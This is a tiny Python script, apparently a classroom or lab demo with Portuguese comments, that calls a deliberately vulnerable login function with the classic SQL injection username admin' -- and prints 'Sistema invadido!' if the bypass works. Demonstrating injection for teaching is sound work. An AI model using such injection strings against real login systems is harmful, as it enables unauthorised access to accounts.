from login_vulneravel import login

# ataque clássico
usuario = "admin' --"
senha = "qualquer"

if login(usuario, senha):
    print("Sistema invadido!")
else:
    print("Falhou")